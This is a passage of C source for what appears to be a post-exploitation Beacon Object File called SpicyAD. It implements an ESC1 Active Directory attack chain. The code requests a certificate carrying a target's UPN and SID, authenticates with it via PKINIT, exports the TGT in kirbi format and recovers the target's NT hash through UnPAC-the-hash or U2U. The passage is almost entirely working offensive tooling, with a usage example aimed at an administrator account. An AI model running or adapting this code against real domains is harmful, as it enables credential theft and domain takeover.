        memcpy(result + offset, hash, copyLen);
        offset += copyLen;
        counter++;
    }

    free(toHash);
}

/* Derive session key from DH shared secret (RFC 4556) */
static void DeriveSessionKey(BYTE* sharedSecret, int secretLen, BYTE* serverNonce, int nonceLen, BYTE* sessionKey, int keyLen) {
    /* x = Z || server_nonce (client nonce is empty per Rubeus) */
    int xLen = secretLen + nonceLen;
    BYTE* x = (BYTE*)malloc(xLen);

    memcpy(x, sharedSecret, secretLen);
    if (nonceLen > 0 && serverNonce) {
        memcpy(x + secretLen, serverNonce, nonceLen);
    }

    /* Apply kTruncate */
    KTruncate(keyLen, x, xLen, sessionKey);

    free(x);
}

/*
 * =============================================================================
 * Extract KDC DH Public Key from PA-PK-AS-REP
 * =============================================================================
 */

/* Extract KDC's DH public key from AS-REP */
static BYTE* ExtractKdcDhPublicKey(BYTE* asRep, int asRepLen, int* keyLen) {
    int i;
    /* DH OID pattern: 1.2.840.10046.2.1 = 2A 86 48 CE 3E 02 01 */
    BYTE dhOidPattern[] = { 0x2A, 0x86, 0x48, 0xCE, 0x3E, 0x02, 0x01 };

    /* Search for DH OID in response */
    for (i = 0; i < asRepLen - (int)sizeof(dhOidPattern) - 10; i++) {
        int j, found = 1;
        for (j = 0; j < (int)sizeof(dhOidPattern); j++) {
            if (asRep[i + j] != dhOidPattern[j]) {
                found = 0;
                break;
            }
        }

        if (found) {
            /* Found DH OID, now search for large INTEGER (~128 bytes) */
            int searchStart = i + sizeof(dhOidPattern);
            int searchEnd = (searchStart + 500 < asRepLen) ? searchStart + 500 : asRepLen - 10;

            for (j = searchStart; j < searchEnd; j++) {
                if (asRep[j] == 0x02) { /* INTEGER tag */
                    int len = 0;
                    int lenBytes = 1;
                    int dataOffset;

                    if ((asRep[j + 1] & 0x80) != 0) {
                        lenBytes = (asRep[j + 1] & 0x7F) + 1;
                        int k;
                        for (k = 1; k < lenBytes; k++) {
                            len = (len << 8) | asRep[j + 1 + k];
                        }
                    } else {
                        len = asRep[j + 1];
                    }

                    dataOffset = j + 1 + lenBytes;

                    /* Looking for ~128 byte integer (DH public key) */
                    if (len >= 120 && len <= 140) {
                        BYTE* result = (BYTE*)malloc(128);
                        BYTE* intData = asRep + dataOffset;
                        int copyLen = len;
                        int destOffset = 0;

                        /* Skip leading zero if present */
                        if (intData[0] == 0 && copyLen > 1) {
                            intData++;
                            copyLen--;
                        }

                        /* Pad to 128 bytes */
                        memset(result, 0, 128);
                        destOffset = 128 - copyLen;
                        if (destOffset < 0) destOffset = 0;
                        memcpy(result + destOffset, intData, (copyLen > 128) ? 128 : copyLen);

                        *keyLen = 128;
                        return result;
                    }
                }
            }
        }
    }

    /* Fallback: Search for any large INTEGER that could be the DH public key */
    for (i = 0; i < asRepLen - 140; i++) {
        if (asRep[i] == 0x02) { /* INTEGER tag */
            int len = 0;
            int lenBytes = 1;
            int dataOffset;

            if ((asRep[i + 1] & 0x80) != 0) {
                lenBytes = (asRep[i + 1] & 0x7F) + 1;
                int k;
                for (k = 1; k < lenBytes; k++) {
                    len = (len << 8) | asRep[i + 1 + k];
                }
            } else {
                len = asRep[i + 1];
            }

            /* Looking for ~128 byte integer (DH public key) */
            if (len >= 120 && len <= 140) {
                dataOffset = i + 1 + lenBytes;

                BYTE* result = (BYTE*)malloc(128);
                BYTE* intData = asRep + dataOffset;
                int copyLen = len;
                int destOffset = 0;

                /* Skip leading zero if present */
                if (intData[0] == 0 && copyLen > 1) {
                    intData++;
                    copyLen--;
                }

                /* Pad to 128 bytes */
                memset(result, 0, 128);
                destOffset = 128 - copyLen;
                if (destOffset < 0) destOffset = 0;
                memcpy(result + destOffset, intData, (copyLen > 128) ? 128 : copyLen);

                *keyLen = 128;
                return result;
            }
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[!] Could not find DH public key (no 128-byte INTEGER found)");
    *keyLen = 0;
    return NULL;
}

/* Extract server DH nonce from PA-PK-AS-REP */
static BYTE* ExtractServerDhNonce(BYTE* asRep, int asRepLen, int* nonceLen) {
    int i;
    /* Search for 32-byte OCTET STRING that could be server nonce */
    for (i = 0; i < asRepLen - 34; i++) {
        if (asRep[i] == 0x04 && asRep[i + 1] == 0x20) { /* OCTET STRING of 32 bytes */
            BYTE* candidate = asRep + i + 2;
            int j, hasVariation = 0, allZero = 1;

            for (j = 1; j < 32; j++) {
                if (candidate[j] != candidate[0]) hasVariation = 1;
                if (candidate[j] != 0) allZero = 0;
            }

            if (hasVariation && !allZero) {
                BYTE* result = (BYTE*)malloc(32);
                memcpy(result, candidate, 32);
                *nonceLen = 32;
                return result;
            }
        }
    }

    *nonceLen = 0;
    return NULL;
}

/* Kerberos error code descriptions */
static const char* GetKrbErrorDesc(int code) {
    switch(code) {
        case 3: return "KDC_ERR_BAD_PVNO - Bad protocol version";
        case 6: return "KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found in database";
        case 7: return "KDC_ERR_S_PRINCIPAL_UNKNOWN - Server not found in database";
        case 14: return "KDC_ERR_PA_CHECKSUM_MUST_BE_INCLUDED - Checksum must be included";
        case 16: return "KDC_ERR_PADATA_TYPE_NOSUPP - PA-DATA type not supported";
        case 17: return "KDC_ERR_TRTYPE_NOSUPP - Transited type not supported";
        case 18: return "KDC_ERR_CLIENT_REVOKED - Client's credentials revoked";
        case 24: return "KDC_ERR_PREAUTH_FAILED - Pre-authentication failed";
        case 25: return "KDC_ERR_PREAUTH_REQUIRED - Pre-authentication required";
        case 41: return "KDC_ERR_CLIENT_NOT_TRUSTED - Client not trusted for PKINIT";
        case 42: return "KDC_ERR_KDC_NOT_TRUSTED - KDC not trusted for PKINIT";
        case 43: return "KDC_ERR_INVALID_SIG - Invalid certificate signature";
        case 44: return "KDC_ERR_DH_KEY_PARAMETERS_NOT_ACCEPTED - DH parameters rejected";
        case 62: return "KRB_AP_ERR_USER_TO_USER_REQUIRED - U2U required";
        case 68: return "KDC_ERR_WRONG_REALM - Wrong realm";
        case 69: return "KDC_ERR_CANT_VERIFY_CERTIFICATE - Cannot verify certificate";
        case 70: return "KDC_ERR_INVALID_CERTIFICATE - Invalid certificate";
        case 71: return "KDC_ERR_REVOKED_CERTIFICATE - Certificate revoked";
        case 72: return "KDC_ERR_REVOCATION_STATUS_UNKNOWN - Revocation status unknown";
        case 73: return "KDC_ERR_REVOCATION_STATUS_UNAVAILABLE - Revocation status unavailable";
        case 75: return "KDC_ERR_INCONSISTENT_KEY_PURPOSE - Inconsistent key purpose";
        case 76: return "KDC_ERR_DIGEST_IN_CERT_NOT_ACCEPTED - Digest in cert not accepted";
        case 77: return "KDC_ERR_PA_CHECKSUM_MUST_BE_INCLUDED - PA checksum must be included";
        case 78: return "KDC_ERR_DIGEST_IN_SIGNED_DATA_NOT_ACCEPTED - Digest in signed data not accepted";
        case 79: return "KDC_ERR_PUBLIC_KEY_ENCRYPTION_NOT_SUPPORTED - Public key encryption not supported";
        default: return "Unknown error";
    }
}

/* Process AS-REP and extract NT hash */
static void ProcessAsRep(BYTE* asRep, int asRepLen, PCCERT_CONTEXT pCert,
                         const char* user, const char* realm, const char* kdcHost) {

    /* Check message type */
    if (asRep[0] == 0x7E) {
        /* KRB-ERROR */
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Received KRB-ERROR");
        /* Parse error code */
        int i;
        int errCode = -1;
        for (i = 0; i < asRepLen - 5; i++) {
            if (asRep[i] == 0xA6 && asRep[i+2] == 0x02) { /* error-code [6] INTEGER */
                errCode = 0;
                int errLen = asRep[i+3];
                int j;
                for (j = 0; j < errLen; j++) {
                    errCode = (errCode << 8) | asRep[i+4+j];
                }
                BeaconPrintf(CALLBACK_OUTPUT, "[!] Error code: %d (0x%X)", errCode, errCode);
                BeaconPrintf(CALLBACK_OUTPUT, "[!] %s", GetKrbErrorDesc(errCode));
                break;
            }
        }
        /* Try to find e-text [11] GeneralString */
        for (i = 0; i < asRepLen - 5; i++) {
            if (asRep[i] == 0xAB) { /* e-text [11] */
                int textLen;
                int lenBytes = DecodeLength(asRep, i+1, &textLen);
                if (asRep[i+1+lenBytes] == 0x1B) { /* GeneralString */
                    int strLen;
                    int strLenBytes = DecodeLength(asRep, i+2+lenBytes, &strLen);
                    if (strLen > 0 && strLen < 256) {
                        char etext[256] = {0};
                        memcpy(etext, asRep + i + 2 + lenBytes + strLenBytes, strLen < 255 ? strLen : 255);
                        BeaconPrintf(CALLBACK_OUTPUT, "[!] e-text: %s", etext);
                    }
                }
                break;
            }
        }
        return;
    }

    if (asRep[0] != 0x6B) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Unexpected response type: 0x%02X", asRep[0]);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] TGT obtained!");

    /* Step 1: Extract KDC's DH public key */
    int kdcPubKeyLen;
    BYTE* kdcPubKey = ExtractKdcDhPublicKey(asRep, asRepLen, &kdcPubKeyLen);
    if (!kdcPubKey) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Could not extract KDC DH public key");
        return;
    }

    /* Step 2: Extract server DH nonce (optional) */
    int serverNonceLen;
    BYTE* serverNonce = ExtractServerDhNonce(asRep, asRepLen, &serverNonceLen);

    /* Step 3: Compute DH shared secret: KDC_pubkey^our_privkey mod p */
    BigInt p, y, x, sharedSecret;
    bigint_from_bytes(&p, DH_P_MODP2, sizeof(DH_P_MODP2));
    bigint_from_bytes(&y, kdcPubKey, kdcPubKeyLen);
    bigint_from_bytes(&x, g_dhPrivateKey, sizeof(g_dhPrivateKey));

    bigint_modpow(&sharedSecret, &y, &x, &p);

    BYTE sharedSecretBytes[128];
    bigint_to_bytes(&sharedSecret, sharedSecretBytes, 128);

    /* Step 4: Derive reply key using kTruncate (32 bytes for AES256) */
    BYTE replyKey[32];
    DeriveSessionKey(sharedSecretBytes, 128, serverNonce, serverNonceLen, replyKey, 32);

    /* Store reply key globally */
    memcpy(g_replyKey, replyKey, 32);

    /* Step 5: Extract and decrypt enc-part */
    int encPartLen;
    BYTE* encPart = ExtractEncPartFromAsRep(asRep, asRepLen, &encPartLen);
    if (!encPart) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Could not extract enc-part");
        free(kdcPubKey);
        if (serverNonce) free(serverNonce);
        return;
    }

    /* Decrypt enc-part with reply key (key usage 3) */
    int decryptedLen;
    BYTE* decrypted = KerberosDecrypt(ETYPE_AES256_CTS_HMAC_SHA1, KRB_KEY_USAGE_AS_REP_ENCPART,
                                       replyKey, 32, encPart, encPartLen, &decryptedLen);
    free(encPart);

    if (!decrypted) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to decrypt enc-part");
        free(kdcPubKey);
        if (serverNonce) free(serverNonce);
        return;
    }

    /* Step 6: Extract session key from EncASRepPart */
    int sessionKeyLen, sessionKeyType;
    BYTE* sessionKey = ExtractSessionKey(decrypted, decryptedLen, &sessionKeyLen, &sessionKeyType);
    free(decrypted);

    if (!sessionKey) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Could not extract session key");
        free(kdcPubKey);
        if (serverNonce) free(serverNonce);
        return;
    }

    /* Store session key globally */
    memcpy(g_sessionKey, sessionKey, sessionKeyLen);

    /* Output TGT in kirbi format (Rubeus compatible) */
    {
        int kirbiTgtLen;
        BYTE* kirbiTgt = ExtractTicketFromAsRep(asRep, asRepLen, &kirbiTgtLen);
        if (kirbiTgt) {
            OutputKirbi(kirbiTgt, kirbiTgtLen, sessionKey, sessionKeyLen, sessionKeyType, user, realm);
            free(kirbiTgt);
        }
    }

    /* Step 7: Look for PA-PAC-CREDENTIALS and decrypt */
    int pacCredLen;
    BYTE* pacCred = ExtractPaPacCredentials(asRep, asRepLen, &pacCredLen);
    if (pacCred) {
        /* Decrypt with session key (key usage 16) */
        int decCredLen;
        BYTE* decCred = KerberosDecrypt(sessionKeyType, KRB_KEY_USAGE_PAC_CREDENTIAL,
                                        sessionKey, sessionKeyLen, pacCred, pacCredLen, &decCredLen);
        free(pacCred);

        if (decCred) {
            ParsePacCredentialData(decCred, decCredLen);
            free(decCred);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to decrypt PA-PAC-CREDENTIALS");
        }
    } else {
        /* Extract TGT from AS-REP for U2U */
        int tgtLen;
        BYTE* tgt = ExtractTicketFromAsRep(asRep, asRepLen, &tgtLen);
        if (tgt) {
            /* Perform U2U to get NT hash */
            PerformU2U(kdcHost, user, realm, tgt, tgtLen, sessionKey, sessionKeyLen, replyKey, 32);
            free(tgt);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to extract TGT from AS-REP");
        }
    }

    /* Cleanup */
    free(kdcPubKey);
    free(sessionKey);
    if (serverNonce) free(serverNonce);
}

/*
 * =============================================================================
 * Havoc ArgParser (compatible with Havoc's Packer format)
 * =============================================================================
 */

typedef struct {
    char* buffer;
    int length;
    int position;
} ArgParser;

static void ArgParserInit(ArgParser* p, char* data, int len) {
    p->buffer = data;
    p->length = len;
    p->position = 0;
}

static char* ArgParserGetString(ArgParser* p) {
    if (p->position + 4 > p->length) return NULL;
    unsigned int strLen = *(unsigned int*)(p->buffer + p->position);
    p->position += 4;
    if (strLen == 0 || p->position + strLen > (unsigned int)p->length) return NULL;
    char* str = p->buffer + p->position;
    p->position += strLen;
    return str;
}

/*
 * =============================================================================
 * Certificate Loading - From Base64 or File
 * =============================================================================
 */

/* Load certificate from base64 encoded PFX */
static PCCERT_CONTEXT LoadCertificateFromBase64(const char* base64Pfx, const char* password) {
    BYTE* pfxData = NULL;
    DWORD pfxLen = 0;
    HCERTSTORE hStore = NULL;
    PCCERT_CONTEXT pCert = NULL;
    WCHAR wPassword[256] = {0};

    if (!base64Pfx || !base64Pfx[0]) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] No PFX data provided");
        return NULL;
    }

    /* Convert password to wide string */
    if (password && password[0]) {
        MultiByteToWideChar(CP_ACP, 0, password, -1, wPassword, 256);
    }

    /* Decode base64 to binary */
    DWORD base64Len = (DWORD)strlen(base64Pfx);

    /* Get required buffer size - use ANY flag for flexibility */
    if (!CryptStringToBinaryA(base64Pfx, base64Len, CRYPT_STRING_BASE64_ANY, NULL, &pfxLen, NULL, NULL)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to get base64 decode size: 0x%08X", GetLastError());
        return NULL;
    }

    pfxData = (BYTE*)malloc(pfxLen);
    if (!pfxData) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to allocate memory for PFX");
        return NULL;
    }

    /* Decode base64 */
    if (!CryptStringToBinaryA(base64Pfx, base64Len, CRYPT_STRING_BASE64_ANY, pfxData, &pfxLen, NULL, NULL)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to decode base64: 0x%08X", GetLastError());
        free(pfxData);
        return NULL;
    }

    /* Import PFX */
    CRYPT_DATA_BLOB pfxBlob;
    pfxBlob.pbData = pfxData;
    pfxBlob.cbData = pfxLen;

    hStore = PFXImportCertStore(&pfxBlob, wPassword, CRYPT_EXPORTABLE | CRYPT_USER_KEYSET);
    free(pfxData);

    if (!hStore) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to import PFX: 0x%08X", GetLastError());
        return NULL;
    }

    /* Get first certificate with private key */
    pCert = CertEnumCertificatesInStore(hStore, NULL);
    if (!pCert) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] No certificates in PFX");
        CertCloseStore(hStore, 0);
        return NULL;
    }

    /* Note: We're not closing the store yet as the cert context needs it */
    return pCert;
}

/* Load certificate from file path (fallback) */
static PCCERT_CONTEXT LoadCertificateFromPfx(const char* pfxPath, const char* password) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    BYTE* pfxData = NULL;
    DWORD pfxLen = 0;
    HCERTSTORE hStore = NULL;
    PCCERT_CONTEXT pCert = NULL;
    WCHAR wPfxPath[MAX_PATH];
    WCHAR wPassword[256] = {0};

    /* Convert paths to wide strings */
    MultiByteToWideChar(CP_ACP, 0, pfxPath, -1, wPfxPath, MAX_PATH);
    if (password) {
        MultiByteToWideChar(CP_ACP, 0, password, -1, wPassword, 256);
    }

    /* Read PFX file */
    hFile = CreateFileW(wPfxPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to open PFX file: %s", pfxPath);
        return NULL;
    }

    pfxLen = GetFileSize(hFile, NULL);
    pfxData = (BYTE*)malloc(pfxLen);

    DWORD bytesRead;
    if (!ReadFile(hFile, pfxData, pfxLen, &bytesRead, NULL)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to read PFX file");
        CloseHandle(hFile);
        free(pfxData);
        return NULL;
    }
    CloseHandle(hFile);

    /* Import PFX */
    CRYPT_DATA_BLOB pfxBlob;
    pfxBlob.pbData = pfxData;
    pfxBlob.cbData = pfxLen;

    hStore = PFXImportCertStore(&pfxBlob, wPassword, CRYPT_EXPORTABLE | CRYPT_USER_KEYSET);
    free(pfxData);

    if (!hStore) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to import PFX: 0x%08X", GetLastError());
        return NULL;
    }

    /* Get first certificate with private key */
    pCert = CertEnumCertificatesInStore(hStore, NULL);
    if (!pCert) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] No certificates in PFX");
        CertCloseStore(hStore, 0);
        return NULL;
    }

    /* Note: We're not closing the store yet as the cert context needs it */
    return pCert;
}

/*
 * =============================================================================
 * Get KDC Address
 * =============================================================================
 */

static void GetKdcForDomain(const char* domain, char* kdcHost, int kdcHostLen) {
    WCHAR wDomain[256];
    PDOMAIN_CONTROLLER_INFOW dcInfo = NULL;

    MultiByteToWideChar(CP_ACP, 0, domain, -1, wDomain, 256);

    if (DsGetDcNameW(NULL, wDomain, NULL, NULL, DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &dcInfo) == ERROR_SUCCESS) {
        WideCharToMultiByte(CP_ACP, 0, dcInfo->DomainControllerName + 2, -1, kdcHost, kdcHostLen, NULL, NULL);
        NetApiBufferFree(dcInfo);
    } else {
        /* Fallback to domain name */
        strcpy(kdcHost, domain);
    }
}

/*
 * =============================================================================
 * Main Attack Chain
 * =============================================================================
 */

void DoESC1FullChain(char* pfxData, char* password, char* targetUser, char* domain, char* kdcHost, int isBase64) {
    PCCERT_CONTEXT pCert = NULL;
    char user[256] = {0};
    char domainBuf[256] = {0};
    char kdcBuf[256] = {0};
    char* atSign;

#if VERBOSE
    BeaconPrintf(CALLBACK_OUTPUT, "");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================");
    BeaconPrintf(CALLBACK_OUTPUT, "  SpicyAD - ESC1 Full Attack Chain");
    BeaconPrintf(CALLBACK_OUTPUT, "  PKINIT + UnPAC-the-hash");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================");
    BeaconPrintf(CALLBACK_OUTPUT, "");
#endif

    if (!pfxData || !pfxData[0]) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Usage: spicyad-pkinit <PFX_Base64> [Password] [User@Domain] [KDC]");
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Example: spicyad-pkinit MIIQ... \"\" administrator@corp.local dc01.corp.local");
        return;
    }

    /* Parse target user */
    if (targetUser && targetUser[0]) {
        atSign = strchr(targetUser, '@');
        if (atSign) {
            int userLen = (int)(atSign - targetUser);
            memcpy(user, targetUser, userLen);
            user[userLen] = '\0';
            strcpy(domainBuf, atSign + 1);
        } else {
            strcpy(user, targetUser);
        }
    }

    /* Use provided domain if available */
    if (domain && domain[0]) {
        strcpy(domainBuf, domain);
    }

    /* Get domain from environment if not provided */
    if (!domainBuf[0]) {
        /* Would use GetComputerNameExW or environment */
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Domain not specified and not auto-detected");
        return;
    }

#if VERBOSE
    BeaconPrintf(CALLBACK_OUTPUT, "[*] PFX: %s", isBase64 ? "(base64 data)" : pfxData);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target: %s@%s", user[0] ? user : "(from cert)", domainBuf);
    BeaconPrintf(CALLBACK_OUTPUT, "");
    BeaconPrintf(CALLBACK_OUTPUT, "===========================================");
    BeaconPrintf(CALLBACK_OUTPUT, "[PHASE 1] Loading Certificate");
    BeaconPrintf(CALLBACK_OUTPUT, "===========================================");
    BeaconPrintf(CALLBACK_OUTPUT, "");
#endif
    /* ===== PHASE 1: Load Certificate ===== */

    if (isBase64) {
        pCert = LoadCertificateFromBase64(pfxData, password);
    } else {
        pCert = LoadCertificateFromPfx(pfxData, password);
    }

    if (!pCert) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to load certificate");
        return;
    }

    /* Extract user from certificate if not provided */
    if (!user[0]) {
        /* TODO: Parse SAN for UPN */
        strcpy(user, "administrator"); /* Placeholder */
    }

    /* ===== PHASE 2: Get KDC ===== */
    if (kdcHost && kdcHost[0]) {
        strcpy(kdcBuf, kdcHost);
    } else {
        GetKdcForDomain(domainBuf, kdcBuf, sizeof(kdcBuf));
    }

    /* ===== PHASE 3: PKINIT Authentication ===== */

    /* Build PKINIT AS-REQ */
    int asReqLen;
    BYTE* asReq = BuildPkinitAsReq(pCert, user, domainBuf, &asReqLen);

    if (asReq) {
        /* Send to KDC */
        int asRepLen;
        BYTE* asRep = SendToKdc(kdcBuf, 88, asReq, asReqLen, &asRepLen);

        if (asRep) {
            /* ===== PHASE 4: Process AS-REP ===== */
            /* Convert domain to uppercase for realm */
            char realm[256] = {0};
            int ri;
            for (ri = 0; domainBuf[ri] && ri < 255; ri++) {
                realm[ri] = (domainBuf[ri] >= 'a' && domainBuf[ri] <= 'z')
                          ? domainBuf[ri] - 'a' + 'A' : domainBuf[ri];
            }

            ProcessAsRep(asRep, asRepLen, pCert, user, realm, kdcBuf);
            free(asRep);
        }

        free(asReq);
    }

    /* Cleanup */
    if (pCert) CertFreeCertificateContext(pCert);
}



/*
 * =============================================================================
 * ESC1 Certificate Request + LDAP SID Lookup
 * =============================================================================
 */


/* LDAP constants */
#ifndef LDAP_PORT
#define LDAP_PORT 389
#endif
#ifndef LDAP_SCOPE_SUBTREE
#define LDAP_SCOPE_SUBTREE 0x02
#endif
#ifndef LDAP_AUTH_NEGOTIATE
#define LDAP_AUTH_NEGOTIATE 0x0486
#endif
#ifndef LDAP_OPT_REFERRALS
#define LDAP_OPT_REFERRALS 0x08
#endif
#ifndef LDAP_SUCCESS
#define LDAP_SUCCESS 0x00
#endif

/*
 * LookupUserSID_Unpac - Query AD for user's objectSid via LDAP
 * First tries userPrincipalName, then falls back to sAMAccountName
 * Uses heap allocation to avoid BOF stack overflow
 */
static BOOL LookupUserSID_Unpac(const char* szUPN, BYTE** ppSid, DWORD* pdwSidLen) {
    LDAP* pLdap = NULL;
    LDAPMessage* pResults = NULL;
    LDAPMessage* pEntry = NULL;
    struct berval** ppValues = NULL;
    /* Heap-allocated buffers to avoid BOF stack overflow */
    WCHAR* wszDomain = NULL;
    WCHAR* wszBaseDN = NULL;
    WCHAR* wszFilter = NULL;
    WCHAR* wszUPN = NULL;
    WCHAR* wszSamAccount = NULL;
    char* szSamAccount = NULL;
    WCHAR* attrs[] = { L"objectSid", NULL };
    ULONG ulResult;
    BOOL bSuccess = FALSE;
    char* pAt = NULL;
    const char* pDomainStart = NULL;
    ULONG ulOff = 0;
    int usernameLen = 0;

    *ppSid = NULL;
    *pdwSidLen = 0;

    /* Allocate buffers on heap */
    wszDomain = (WCHAR*)malloc(256 * sizeof(WCHAR));
    wszBaseDN = (WCHAR*)malloc(512 * sizeof(WCHAR));
    wszFilter = (WCHAR*)malloc(512 * sizeof(WCHAR));
    wszUPN = (WCHAR*)malloc(256 * sizeof(WCHAR));
    wszSamAccount = (WCHAR*)malloc(256 * sizeof(WCHAR));
    szSamAccount = (char*)malloc(256);

    if (!wszDomain || !wszBaseDN || !wszFilter || !wszUPN || !wszSamAccount || !szSamAccount) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to allocate memory for SID lookup");
        goto cleanup_sid;
    }

    memset(wszDomain, 0, 256 * sizeof(WCHAR));
    memset(wszBaseDN, 0, 512 * sizeof(WCHAR));
    memset(wszFilter, 0, 512 * sizeof(WCHAR));
    memset(wszUPN, 0, 256 * sizeof(WCHAR));
    memset(wszSamAccount, 0, 256 * sizeof(WCHAR));
    memset(szSamAccount, 0, 256);

    pAt = strchr(szUPN, '@');
    if (!pAt || !*(pAt + 1)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Invalid UPN format for SID lookup");
        goto cleanup_sid;
    }
    pDomainStart = pAt + 1;

    /* Extract username part (before @) for sAMAccountName fallback */
    usernameLen = (int)(pAt - szUPN);
    if (usernameLen > 0 && usernameLen < 256) {
        memcpy(szSamAccount, szUPN, usernameLen);
        szSamAccount[usernameLen] = '\0';
        MultiByteToWideChar(CP_UTF8, 0, szSamAccount, -1, wszSamAccount, 256);
    }

    MultiByteToWideChar(CP_UTF8, 0, pDomainStart, -1, wszDomain, 256);
    MultiByteToWideChar(CP_UTF8, 0, szUPN, -1, wszUPN, 256);

    /* Build base DN from domain */
    {
        WCHAR* pSrc = wszDomain;
        WCHAR* pDst = wszBaseDN;
        WCHAR* pSegStart = pSrc;
        while (*pSrc) {
            if (*pSrc == L'.') {
                wcscpy(pDst, L"DC=");
                pDst += 3;
                while (pSegStart < pSrc) *pDst++ = *pSegStart++;
                *pDst++ = L',';
                pSegStart = pSrc + 1;
            }
            pSrc++;
        }
        wcscpy(pDst, L"DC=");
        pDst += 3;
        while (*pSegStart) *pDst++ = *pSegStart++;
        *pDst = L'\0';
    }

    pLdap = ldap_initW(wszDomain, LDAP_PORT);
    if (!pLdap) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_init failed");
        goto cleanup_sid;
    }

    ulOff = 0;
    ldap_set_optionW(pLdap, LDAP_OPT_REFERRALS, &ulOff);

    ulResult = ldap_bind_sW(pLdap, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (ulResult != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_bind_s failed: %u", ulResult);
        ldap_unbind(pLdap);
        goto cleanup_sid;
    }

    /* First try: search by userPrincipalName */
    swprintf(wszFilter, L"(userPrincipalName=%s)", wszUPN);
    ulResult = ldap_search_sW(pLdap, wszBaseDN, LDAP_SCOPE_SUBTREE, wszFilter, attrs, 0, &pResults);
    if (ulResult != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_search_s failed: %u", ulResult);
        ldap_unbind(pLdap);
        goto cleanup_sid;
    }

    pEntry = ldap_first_entry(pLdap, pResults);

    /* Fallback: if UPN not found, try sAMAccountName */
    if (!pEntry && usernameLen > 0) {
        ldap_msgfree(pResults);
        pResults = NULL;

        swprintf(wszFilter, L"(sAMAccountName=%s)", wszSamAccount);
        ulResult = ldap_search_sW(pLdap, wszBaseDN, LDAP_SCOPE_SUBTREE, wszFilter, attrs, 0, &pResults);
        if (ulResult == LDAP_SUCCESS) {
            pEntry = ldap_first_entry(pLdap, pResults);
            if (pEntry) {
                if (VERBOSE) BeaconPrintf(CALLBACK_OUTPUT, "[*] Found user by sAMAccountName: %s", szSamAccount);
            }
        }
    }

    if (!pEntry) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] User not found in AD: %s", szUPN);
        ldap_msgfree(pResults);
        ldap_unbind(pLdap);
        goto cleanup_sid;
    }

    ppValues = ldap_get_values_lenW(pLdap, pEntry, L"objectSid");
    if (ppValues && ppValues[0] && ppValues[0]->bv_len > 0) {
        if (IsValidSid((PSID)ppValues[0]->bv_val)) {
            DWORD dwSidLen = GetLengthSid((PSID)ppValues[0]->bv_val);
            *ppSid = (BYTE*)malloc(dwSidLen);
            if (*ppSid) {
                memcpy(*ppSid, ppValues[0]->bv_val, dwSidLen);
                *pdwSidLen = dwSidLen;
                bSuccess = TRUE;
                {
                    LPSTR szSidStr = NULL;
                    if (ConvertSidToStringSidA((PSID)*ppSid, &szSidStr)) {
                        LocalFree(szSidStr);
                    }
                }
            }
        }
        ldap_value_free_len(ppValues);
    }

    ldap_msgfree(pResults);
    ldap_unbind(pLdap);

cleanup_sid:
    if (wszDomain) free(wszDomain);
    if (wszBaseDN) free(wszBaseDN);
    if (wszFilter) free(wszFilter);
    if (wszUPN) free(wszUPN);
    if (wszSamAccount) free(wszSamAccount);
    if (szSamAccount) free(szSamAccount);
    return bSuccess;
}

/*
 * =============================================================================
 * ESC1 Certificate Request - Returns PFX base64 for PKINIT
 * =============================================================================
 */

static char* DoESC1CertRequest(char* szCA, char* szTemplate, char* szTargetUPN, int* pfxLen) {
    HRESULT hr;
    ICertRequest* pCertRequest = NULL;
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    PCCERT_CONTEXT pCertContext = NULL;
    HCERTSTORE hMemStore = NULL;
    BOOL bResult = FALSE;
    GUID guid;
    WCHAR wszContainerName[64];
    char szSubjectCN[256];
    BYTE* pbSubject = NULL;
    DWORD cbSubject = 0;
    CERT_REQUEST_INFO reqInfo;
    BYTE* pbEncodedUPN = NULL;
    DWORD cbEncodedUPN = 0;
    CERT_OTHER_NAME otherName;
    CERT_ALT_NAME_ENTRY altNameEntries[2];  /* UPN + SID URL */
    CERT_ALT_NAME_INFO altNameInfo;
    /* SID-related variables */
    BYTE* pbUserSID = NULL;
    DWORD dwUserSIDLen = 0;
    DWORD dwAltNameCount = 1;
    BYTE* pbEncodedSAN = NULL;
    DWORD cbEncodedSAN = 0;
    CERT_EXTENSION sanExt;
    CERT_EXTENSIONS exts;
    BYTE* pbEncodedExts = NULL;
